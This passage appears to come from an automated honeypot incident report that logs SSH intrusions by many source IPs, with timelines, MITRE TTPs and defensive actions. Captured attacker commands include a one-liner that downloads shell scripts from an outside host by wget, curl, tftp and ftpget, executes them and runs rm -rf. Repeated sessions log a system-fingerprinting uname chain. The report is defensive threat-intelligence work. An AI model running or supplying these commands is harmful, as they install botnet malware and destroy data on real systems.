| `2026-07-11 11:14:53` | `cowrie.command.input` |
| `2026-07-11 11:14:53` | `cowrie.command.input` |
| `2026-07-11 11:14:53` | `cowrie.command.input` |
| `2026-07-11 11:14:53` | `cowrie.command.input` |
| `2026-07-11 11:14:54` | `cowrie.log.closed` |
| `2026-07-11 11:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85d5a6e0b5f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:16 |
| **Last Seen** | 2026-07-11 11:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:16:32` | `cowrie.session.connect` |
| `2026-07-11 11:16:32` | `cowrie.client.version` |
| `2026-07-11 11:16:32` | `cowrie.client.kex` |
| `2026-07-11 11:16:33` | `cowrie.login.success` |
| `2026-07-11 11:16:35` | `cowrie.session.params` |
| `2026-07-11 11:16:35` | `cowrie.command.input` |
| `2026-07-11 11:16:35` | `cowrie.command.input` |
| `2026-07-11 11:16:35` | `cowrie.command.input` |
| `2026-07-11 11:16:35` | `cowrie.command.input` |
| `2026-07-11 11:16:35` | `cowrie.command.input` |
| `2026-07-11 11:16:35` | `cowrie.command.success` |
| `2026-07-11 11:16:35` | `cowrie.command.input` |
| `2026-07-11 11:16:35` | `cowrie.command.input` |
| `2026-07-11 11:16:35` | `cowrie.command.input` |
| `2026-07-11 11:16:35` | `cowrie.command.input` |
| `2026-07-11 11:16:35` | `cowrie.log.closed` |
| `2026-07-11 11:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba  (ELF Binary (Linux executable))
   SHA256: 7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a...
   Score : 86/100  |  VT: 40/74
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Download via TFTP: tftp
   ↳ Download via ftpget: ftpget
```

### 🔴 HIGH · IR-49839690c2aa

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]230` |
| **First Seen** | 2026-07-11 11:16 |
| **Last Seen** | 2026-07-11 11:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189[.]92/nz.sh; curl -O hxxp://41.216.189[.]92/nz.sh; chmod 777 nz.sh; sh nz.sh; tftp 41.216.189[.]92 -c get nz.sh; chmod 777 nz.sh; sh nz.sh; tftp -r 3.sh -g 41.216.189[.]92; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 41.216.189[.]92 2.sh 2.sh; sh 2.sh; rm -rf nz.sh nz.sh 3.sh 2.sh; rm -rf *` |
| **Download Attempts** | hxxp://41.216.189[.]92/nz.sh, hxxp://41.216.189[.]92/nz.sh, hxxp://41.216.189[.]92/nz/nz.x86 |
| **Malware Analysis** | 77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc (MEDIUM), 7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:16:45` | `cowrie.session.connect` |
| `2026-07-11 11:16:47` | `cowrie.client.version` |
| `2026-07-11 11:16:47` | `cowrie.client.kex` |
| `2026-07-11 11:16:51` | `cowrie.login.success` |
| `2026-07-11 11:16:54` | `cowrie.session.params` |
| `2026-07-11 11:16:54` | `cowrie.command.input` |
| `2026-07-11 11:16:54` | `cowrie.session.file_download` |
| `2026-07-11 11:16:54` | `cowrie.session.file_download` |
| `2026-07-11 11:16:55` | `cowrie.session.file_download` |
| `2026-07-11 11:16:55` | `cowrie.session.file_download.failed` |
| `2026-07-11 11:16:55` | `cowrie.session.file_download` |
| `2026-07-11 11:16:55` | `cowrie.session.file_download` |
| `2026-07-11 11:16:55` | `cowrie.session.file_download` |
| `2026-07-11 11:16:55` | `cowrie.log.closed` |
| `2026-07-11 11:16:55` | `cowrie.session.file_download` |
| `2026-07-11 11:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]230` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12955e2d6181

| Field | Detail |
|---|---|
| **Source IP** | `171.231.192[.]229` |
| **First Seen** | 2026-07-11 11:17 |
| **Last Seen** | 2026-07-11 11:19 |
| **Session Duration** | 100s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:17:41` | `cowrie.session.connect` |
| `2026-07-11 11:17:42` | `cowrie.client.version` |
| `2026-07-11 11:17:42` | `cowrie.client.kex` |
| `2026-07-11 11:18:24` | `cowrie.login.success` |
| `2026-07-11 11:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.192[.]229` to AbuseIPDB if not already reported
- [ ] Block `171.231.192[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d76027b0d503

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]68` |
| **First Seen** | 2026-07-11 11:17 |
| **Last Seen** | 2026-07-11 11:22 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:17:48` | `cowrie.session.connect` |
| `2026-07-11 11:17:48` | `cowrie.client.version` |
| `2026-07-11 11:17:48` | `cowrie.client.kex` |
| `2026-07-11 11:17:48` | `cowrie.login.success` |
| `2026-07-11 11:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]68` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-464d4fc4af84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:18 |
| **Last Seen** | 2026-07-11 11:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:18:12` | `cowrie.session.connect` |
| `2026-07-11 11:18:12` | `cowrie.client.version` |
| `2026-07-11 11:18:12` | `cowrie.client.kex` |
| `2026-07-11 11:18:14` | `cowrie.login.success` |
| `2026-07-11 11:18:15` | `cowrie.session.params` |
| `2026-07-11 11:18:15` | `cowrie.command.input` |
| `2026-07-11 11:18:15` | `cowrie.command.input` |
| `2026-07-11 11:18:15` | `cowrie.command.input` |
| `2026-07-11 11:18:15` | `cowrie.command.input` |
| `2026-07-11 11:18:15` | `cowrie.command.input` |
| `2026-07-11 11:18:15` | `cowrie.command.success` |
| `2026-07-11 11:18:15` | `cowrie.command.input` |
| `2026-07-11 11:18:15` | `cowrie.command.input` |
| `2026-07-11 11:18:15` | `cowrie.command.input` |
| `2026-07-11 11:18:15` | `cowrie.command.input` |
| `2026-07-11 11:18:15` | `cowrie.log.closed` |
| `2026-07-11 11:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7602cb3639

| Field | Detail |
|---|---|
| **Source IP** | `171.231.192[.]229` |
| **First Seen** | 2026-07-11 11:19 |
| **Last Seen** | 2026-07-11 11:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:19:36` | `cowrie.session.connect` |
| `2026-07-11 11:19:36` | `cowrie.client.version` |
| `2026-07-11 11:19:36` | `cowrie.client.kex` |
| `2026-07-11 11:19:40` | `cowrie.login.success` |
| `2026-07-11 11:19:42` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:19:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:19:42` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.192[.]229` to AbuseIPDB if not already reported
- [ ] Block `171.231.192[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb555ed1904c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:19 |
| **Last Seen** | 2026-07-11 11:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:19:53` | `cowrie.session.connect` |
| `2026-07-11 11:19:53` | `cowrie.client.version` |
| `2026-07-11 11:19:53` | `cowrie.client.kex` |
| `2026-07-11 11:19:54` | `cowrie.login.success` |
| `2026-07-11 11:19:55` | `cowrie.session.params` |
| `2026-07-11 11:19:55` | `cowrie.command.input` |
| `2026-07-11 11:19:55` | `cowrie.command.input` |
| `2026-07-11 11:19:55` | `cowrie.command.input` |
| `2026-07-11 11:19:55` | `cowrie.command.input` |
| `2026-07-11 11:19:55` | `cowrie.command.input` |
| `2026-07-11 11:19:55` | `cowrie.command.success` |
| `2026-07-11 11:19:55` | `cowrie.command.input` |
| `2026-07-11 11:19:55` | `cowrie.command.input` |
| `2026-07-11 11:19:55` | `cowrie.command.input` |
| `2026-07-11 11:19:55` | `cowrie.command.input` |
| `2026-07-11 11:19:56` | `cowrie.log.closed` |
| `2026-07-11 11:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33329fcdf26c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-11 11:20 |
| **Last Seen** | 2026-07-11 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:20:39` | `cowrie.session.connect` |
| `2026-07-11 11:20:39` | `cowrie.client.version` |
| `2026-07-11 11:20:39` | `cowrie.client.kex` |
| `2026-07-11 11:20:40` | `cowrie.login.success` |
| `2026-07-11 11:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ec4f11e0933

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-11 11:20 |
| **Last Seen** | 2026-07-11 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:20:39` | `cowrie.session.connect` |
| `2026-07-11 11:20:39` | `cowrie.client.version` |
| `2026-07-11 11:20:39` | `cowrie.client.kex` |
| `2026-07-11 11:20:40` | `cowrie.login.success` |
| `2026-07-11 11:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-148353fff476

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-11 11:21 |
| **Last Seen** | 2026-07-11 11:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:21:20` | `cowrie.session.connect` |
| `2026-07-11 11:21:21` | `cowrie.client.version` |
| `2026-07-11 11:21:21` | `cowrie.client.kex` |
| `2026-07-11 11:21:23` | `cowrie.login.success` |
| `2026-07-11 11:21:23` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b20bd2341b9b

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-07-11 11:21 |
| **Last Seen** | 2026-07-11 11:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:21:34` | `cowrie.session.connect` |
| `2026-07-11 11:21:35` | `cowrie.client.version` |
| `2026-07-11 11:21:35` | `cowrie.client.kex` |
| `2026-07-11 11:21:38` | `cowrie.login.success` |
| `2026-07-11 11:21:39` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f30bfc8a672

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:21 |
| **Last Seen** | 2026-07-11 11:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:21:38` | `cowrie.session.connect` |
| `2026-07-11 11:21:38` | `cowrie.client.version` |
| `2026-07-11 11:21:38` | `cowrie.client.kex` |
| `2026-07-11 11:21:39` | `cowrie.login.success` |
| `2026-07-11 11:21:41` | `cowrie.session.params` |
| `2026-07-11 11:21:41` | `cowrie.command.input` |
| `2026-07-11 11:21:41` | `cowrie.command.input` |
| `2026-07-11 11:21:41` | `cowrie.command.input` |
| `2026-07-11 11:21:41` | `cowrie.command.input` |
| `2026-07-11 11:21:41` | `cowrie.command.input` |
| `2026-07-11 11:21:41` | `cowrie.command.success` |
| `2026-07-11 11:21:41` | `cowrie.command.input` |
| `2026-07-11 11:21:41` | `cowrie.command.input` |
| `2026-07-11 11:21:41` | `cowrie.command.input` |
| `2026-07-11 11:21:41` | `cowrie.command.input` |
| `2026-07-11 11:21:41` | `cowrie.log.closed` |
| `2026-07-11 11:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1787683375e7

| Field | Detail |
|---|---|
| **Source IP** | `116.110.9[.]173` |
| **First Seen** | 2026-07-11 11:22 |
| **Last Seen** | 2026-07-11 11:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:22:24` | `cowrie.session.connect` |
| `2026-07-11 11:22:24` | `cowrie.client.version` |
| `2026-07-11 11:22:25` | `cowrie.client.kex` |
| `2026-07-11 11:22:26` | `cowrie.login.success` |
| `2026-07-11 11:22:26` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:22:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:22:26` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.9[.]173` to AbuseIPDB if not already reported
- [ ] Block `116.110.9[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c952925026ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:23 |
| **Last Seen** | 2026-07-11 11:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:23:20` | `cowrie.session.connect` |
| `2026-07-11 11:23:20` | `cowrie.client.version` |
| `2026-07-11 11:23:20` | `cowrie.client.kex` |
| `2026-07-11 11:23:22` | `cowrie.login.success` |
| `2026-07-11 11:23:23` | `cowrie.session.params` |
| `2026-07-11 11:23:23` | `cowrie.command.input` |
| `2026-07-11 11:23:23` | `cowrie.command.input` |
| `2026-07-11 11:23:23` | `cowrie.command.input` |
| `2026-07-11 11:23:23` | `cowrie.command.input` |
| `2026-07-11 11:23:23` | `cowrie.command.input` |
| `2026-07-11 11:23:23` | `cowrie.command.success` |
| `2026-07-11 11:23:23` | `cowrie.command.input` |
| `2026-07-11 11:23:23` | `cowrie.command.input` |
| `2026-07-11 11:23:23` | `cowrie.command.input` |
| `2026-07-11 11:23:23` | `cowrie.command.input` |
| `2026-07-11 11:23:23` | `cowrie.log.closed` |
| `2026-07-11 11:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03211d54593d

| Field | Detail |
|---|---|
| **Source IP** | `116.110.9[.]173` |
| **First Seen** | 2026-07-11 11:24 |
| **Last Seen** | 2026-07-11 11:24 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:24:14` | `cowrie.session.connect` |
| `2026-07-11 11:24:15` | `cowrie.client.version` |
| `2026-07-11 11:24:15` | `cowrie.client.kex` |
| `2026-07-11 11:24:24` | `cowrie.login.success` |
| `2026-07-11 11:24:26` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:24:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:24:26` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.9[.]173` to AbuseIPDB if not already reported
- [ ] Block `116.110.9[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd25a4218033

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:25 |
| **Last Seen** | 2026-07-11 11:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:25:06` | `cowrie.session.connect` |
| `2026-07-11 11:25:07` | `cowrie.client.version` |
| `2026-07-11 11:25:07` | `cowrie.client.kex` |
| `2026-07-11 11:25:08` | `cowrie.login.success` |
| `2026-07-11 11:25:09` | `cowrie.session.params` |
| `2026-07-11 11:25:09` | `cowrie.command.input` |
| `2026-07-11 11:25:09` | `cowrie.command.input` |
| `2026-07-11 11:25:09` | `cowrie.command.input` |
| `2026-07-11 11:25:09` | `cowrie.command.input` |
| `2026-07-11 11:25:09` | `cowrie.command.input` |
| `2026-07-11 11:25:09` | `cowrie.command.success` |
| `2026-07-11 11:25:09` | `cowrie.command.input` |
| `2026-07-11 11:25:09` | `cowrie.command.input` |
| `2026-07-11 11:25:09` | `cowrie.command.input` |
| `2026-07-11 11:25:09` | `cowrie.command.input` |
| `2026-07-11 11:25:09` | `cowrie.log.closed` |
| `2026-07-11 11:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f82c67cf0481

| Field | Detail |
|---|---|
| **Source IP** | `116.110.9[.]173` |
| **First Seen** | 2026-07-11 11:26 |
| **Last Seen** | 2026-07-11 11:27 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:26:46` | `cowrie.session.connect` |
| `2026-07-11 11:26:48` | `cowrie.client.version` |
| `2026-07-11 11:26:53` | `cowrie.client.kex` |
| `2026-07-11 11:27:00` | `cowrie.login.success` |
| `2026-07-11 11:27:07` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.9[.]173` to AbuseIPDB if not already reported
- [ ] Block `116.110.9[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9718bfa113f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:26 |
| **Last Seen** | 2026-07-11 11:26 |
